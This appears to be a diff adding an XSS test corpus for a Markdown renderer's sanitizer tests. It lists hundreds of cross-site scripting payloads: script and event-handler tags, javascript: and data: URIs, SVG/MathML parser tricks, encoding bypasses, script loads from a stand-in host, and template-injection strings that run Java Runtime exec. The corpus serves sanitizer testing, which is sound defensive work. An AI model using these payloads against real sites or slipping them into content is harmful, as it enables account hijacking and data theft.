@@ -1,0 +1,290 @@
+# SPDX-License-Identifier: Apache-2.0
+# Copyright 2026 Charlie Genova and contributors
+#
+# XSS corpus for MarkdownRendererTest (WP-13). One payload per line; blank lines and lines starting with "#" are
+# skipped. Escapes: \n newline, \t tab, \r carriage return, \0 NUL, \uXXXX any UTF-16 unit, \\ a backslash.
+# Every payload is fed twice: as comment Markdown through the whole pipeline, and as raw HTML straight into the
+# sanitizer (which the Markdown parser would otherwise shield by escaping it). Hosts are reserved test names.
+# Add a line for every bypass ever reported against a Markdown or HTML sanitizer that this project hears of.
+
+# --- script elements --------------------------------------------------------------------------------------------
+<script>alert(1)</script>
+<SCRIPT SRC=//xss.invalid/x.js></SCRIPT>
+<script src="https://xss.invalid/x.js"></script>
+<script/src=data:,alert(1)>
+<script type="module">import('https://xss.invalid/x.js')</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1);//<</script>
+<script>alert(1)
+<script\u000c>alert(1)</script>
+<\u0000script>alert(1)</script>
+<scr\0ipt>alert(1)</scr\0ipt>
+</script><script>alert(1)</script>
+<script>alert(1)</script\n>
+<svg><script>alert(1)</script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<math><script>alert(1)</script></math>
+
+# --- event handlers ---------------------------------------------------------------------------------------------
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)"/>
+<IMG SRC=x ONERROR=alert(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror\u000b=alert(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<div onmouseover="alert(1)">hover</div>
+<p onclick=alert(1)>click</p>
+<strong onclick="alert(1)">bold</strong>
+<em onpointerenter="alert(1)">em</em>
+<ul onclick="alert(1)"><li onclick="alert(1)">x</li></ul>
+<blockquote onfocus="alert(1)" tabindex="0">x</blockquote>
+<code onclick="alert(1)">x</code>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)"></video>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<frameset onload=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<x onclick=alert(1)>custom</x>
+<custom-element onclick="alert(1)">x</custom-element>
+<a href="#" onfocus="alert(1)" autofocus>x</a>
+<b onmouseover=alert(1)>x</b>
+<p onanimationstart=alert(1) style="animation-name:x">x</p>
+
+# --- embedding and navigation elements --------------------------------------------------------------------------
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="javascript:alert(1)"></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="javascript:alert(1)">
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<applet code="x"></applet>
+<form action="javascript:alert(1)"><button>x</button></form>
+<button formaction="javascript:alert(1)">x</button>
+<isindex action=javascript:alert(1) type=image>
+<input type="image" src="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<link rel="stylesheet" href="javascript:alert(1)">
+<link rel="import" href="https://xss.invalid/x.html">
+<bgsound src="javascript:alert(1)">
+<layer src="javascript:alert(1)"></layer>
+<table background="javascript:alert(1)"><tr><td>x</td></tr></table>
+<img srcset="x 1x, javascript:alert(1) 2x">
+<img src="https://xss.invalid/pixel.png">
+<picture><source srcset="javascript:alert(1)"></picture>
+<portal src="https://xss.invalid/"></portal>
+
+# --- styles -----------------------------------------------------------------------------------------------------
+<style>@import 'javascript:alert(1)';</style>
+<style>p{background:url(javascript:alert(1))}</style>
+<p style="background:url(javascript:alert(1))">x</p>
+<div style="width: expression(alert(1))">x</div>
+<a href="https://example.test" style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</a>
+<p class="btn btn-danger visually-hidden">x</p>
+<p id="main">x</p>
+
+# --- SVG and MathML ---------------------------------------------------------------------------------------------
+<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">x</text></a></svg>
+<svg><a href="javascript:alert(1)"><text x="0" y="20">x</text></a></svg>
+<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
+<svg><set attributeName="onload" to="alert(1)"/></svg>
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x"/></svg>
+<svg><image href="javascript:alert(1)"/></svg>
+<svg><rect fill="url(javascript:alert(1))"/></svg>
+<math href="javascript:alert(1)">x</math>
+<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
+<math><mi xlink:href="data:x,<script>alert(1)</script>">x</mi></math>
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+
+# --- links in raw HTML ------------------------------------------------------------------------------------------
+<a href="javascript:alert(1)">x</a>
+<a href="JaVaScRiPt:alert(1)">x</a>
+<a href=" javascript:alert(1)">x</a>
+<a href="jav&#x09;ascript:alert(1)">x</a>
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+<a href="jav&#x0D;ascript:alert(1)">x</a>
+<a href="java\u0000script:alert(1)">x</a>
+<a href=" javascript:alert(1)">x</a>
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">x</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<a href="javascript&#58;alert(1)">x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="livescript:alert(1)">x</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="data:text/html,<script>alert(1)</script>">x</a>
+<a href="file:///etc/passwd">x</a>
+<a href="//xss.invalid/x">x</a>
+<a href="/admin">x</a>
+<a href="https://example.test" target="_blank">x</a>
+<a href="https://example.test" rel="opener">x</a>
+<a href="https://example.test" rel="noopener" target="_top">x</a>
+<a href=https://example.test onmouseover=alert(1)>x</a>
+<a href="https://example.test"onmouseover="alert(1)">x</a>
+<a/href="javascript:alert(1)">x</a>
+<a href="https://example.test" formaction="javascript:alert(1)">x</a>
+<a href="https://example.test" ping="https://xss.invalid/">x</a>
+<a href="https://example.test" download>x</a>
+<a href="https://example.test/%22onmouseover=%22alert(1)">x</a>
+<a href="https://example.test">ok</a><a href="javascript:alert(1)">bad</a>
+<a href="mailto:a@example.test" onclick="alert(1)">mail</a>
+<a href="https://example.test" hx-post="/cases" hx-target="body">x</a>
+<a href="https://example.test" data-bs-toggle="modal">x</a>
+<a name="x" href="https://example.test">x</a>
+
+# --- links in Markdown ------------------------------------------------------------------------------------------
+[x](javascript:alert(1))
+[x](JaVaScRiPt:alert(1))
+[x]( javascript:alert(1) )
+[x](<javascript:alert(1)>)
+[x](&#106;avascript:alert(1))
+[x](&#x6A;avascript:alert(1))
+[x](java&#09;script:alert(1))
+[x](java%0ascript:alert(1))
+[x](javascript&colon;alert(1))
+[x](vbscript:msgbox(1))
+[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+[x](data:text/html,<script>alert(1)</script>)
+[x](file:///etc/passwd)
+[x](//xss.invalid/x)
+[x](/relative/path)
+[x](https://example.test "title\" onmouseover=\"alert(1)")
+[x](https://example.test" onmouseover="alert(1))
+[x](https://example.test?q="><script>alert(1)</script>)
+[x](https://example.test/<script>)
+[x](https:alert(1))
+[x][ref]\n\n[ref]: javascript:alert(1)
+[x][ref]\n\n[ref]: https://example.test "t" onclick=alert(1)
+[x][ref]\n\n[ref]: <javascript:alert(1)>
+[ref]\n\n[ref]: data:text/html,alert(1)
+<javascript:alert(1)>
+<JAVASCRIPT:alert(1)>
+<data:text/html,alert(1)>
+<vbscript:msgbox(1)>
+<https://example.test/" onmouseover="alert(1)>
+<https://example.test/'onmouseover='alert(1)>
+<mailto:a@example.test?body=<script>alert(1)</script>>
+<a@example.test>
+*[x](javascript:alert(1))*
+**[x](https://example.test)** with <u>u</u> and <s>s</s>
+[<script>alert(1)</script>](https://example.test)
+[x](https://example.test)<!-- comment --><img src=x onerror=alert(1)>
+[a](https://example.test) [b](javascript:alert(1)) [c](mailto:c@example.test)
+
+# --- images in Markdown -----------------------------------------------------------------------------------------
+![x](javascript:alert(1))
+![x](https://example.test/x.png" onerror="alert(1))
+![x](https://xss.invalid/track.png)
+![<img src=x onerror=alert(1)>](x)
+![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)
+[![x](https://example.test/p.png)](javascript:alert(1))
+![x][img]\n\n[img]: javascript:alert(1)
+
+# --- Markdown structures around HTML ----------------------------------------------------------------------------
+`<script>alert(1)</script>`
+``<img src=x onerror=alert(1)>``
+```\n<script>alert(1)</script>\n```
+```html onload=alert(1)\n<b>x</b>\n```
+~~~"><script>alert(1)</script>\nx\n~~~
+    <script>alert(1)</script>
+> <script>alert(1)</script>
+> > > <img src=x onerror=alert(1)>
+- <img src=x onerror=alert(1)>
+1. <svg onload=alert(1)>
+**<script>alert(1)</script>**
+*<img src=x onerror=alert(1)>*
+_<iframe src=javascript:alert(1)>_
+# <script>alert(1)</script>
+Title\n===\n<script>alert(1)</script>
+<div>\n*markdown inside html* <script>alert(1)</script>\n</div>
+<details>\n\n[x](javascript:alert(1))\n\n</details>
+\\<script>alert(1)\\</script>
+\\[x](javascript:alert(1))
+[x]\n(javascript:alert(1))
+<p>[x](javascript:alert(1))</p>
+- [ ] <input type="checkbox" onclick="alert(1)">
+| a | b |\n|---|---|\n| <script>alert(1)</script> | x |
+
+# --- entities and encodings -------------------------------------------------------------------------------------
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;img src=x onerror=alert(1)&#x3E;
+&#0000060script&#0000062alert(1)
+%3Cscript%3Ealert(1)%3C/script%3E
+\\u003cscript\\u003ealert(1)\\u003c/script\\u003e
+＜script＞alert(1)＜/script＞
+<scr\u200bipt>alert(1)</scr\u200bipt>
+< script>alert(1)</script>
+&amp;lt;script&amp;gt;alert(1)
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<a href="&#x26;#x6A;avascript:alert(1)">x</a>
+<img src=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)>
+
+# --- comments, CDATA, doctype and processing instructions -------------------------------------------------------
+<!--<script>alert(1)</script>-->
+<!--[if gte IE 4]><script>alert(1)</script><![endif]-->
+<!-- --!><img src=x onerror=alert(1)> -->
+<![CDATA[<script>alert(1)</script>]]>
+<?xml version="1.0"?><script>alert(1)</script>
+<!DOCTYPE html><script>alert(1)</script>
+<? onload=alert(1) ?>
+
+# --- unclosed tags and attribute breaking -----------------------------------------------------------------------
+<div><p>unclosed <b>bold <i>italic <script>alert(1)
+<p>x</p></div></div><script>alert(1)</script>
+<a href="https://example.test">unclosed link
+<a href="https://example.test
+<img src="x onerror=alert(1)//
+<<a>a href="javascript:alert(1)">x</a>
+<a <a href="javascript:alert(1)">x</a>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+`><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</p></li></ul></blockquote><script>alert(1)</script>
+</code></pre><img src=x onerror=alert(1)>
+<p title="x"><img src=x onerror=alert(1)>"</p>
+<p title='"><script>alert(1)</script>'>x</p>
+<img src="x` `<script>alert(1)</script>"` `>
+<img """><script>alert(1)</script>">
+<a href="https://example.test" title="a"onclick="alert(1)">x</a>
+<a href='https://example.test' title='a'onclick='alert(1)'>x</a>
+<strong title="</strong><img src=x onerror=alert(1)>">x</strong>
+
+# --- raw-text and parser-switching elements ---------------------------------------------------------------------
+<plaintext><script>alert(1)</script>
+<xmp><script>alert(1)</script></xmp>
+<listing><img src=x onerror=alert(1)></listing>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed>
+<noframes><img title="</noframes><img src=x onerror=alert(1)>"></noframes>
+<select><template><img src=x onerror=alert(1)></template></select>
+<template><script>alert(1)</script></template>
+<textarea><script>alert(1)</script></textarea>
+<title><img src=x onerror=alert(1)></title>
+<style><img src=x onerror=alert(1)></style>
+<table><td><svg><desc><img src=x onerror=alert(1)></desc></svg></td></table>
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+
+# --- template, htmx and framework injection (inert text here, never markup) -------------------------------------
+{{constructor.constructor('alert(1)')()}}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+[(${T(java.lang.Runtime).getRuntime().exec('id')})]
+${7*7} __${7*7}__ #{7*7} *{7*7}
+<div hx-get="/admin" hx-trigger="load">x</div>
+<div hx-on:click="alert(1)">x</div>
+<div hx-on::after-request="alert(1)">x</div>
+<div data-bind="html: '<img src=x onerror=alert(1)>'">x</div>
+<div th:utext="${x}" tk:safe="${x}">x</div>
+<dialog open onclose="alert(1)">x</dialog>
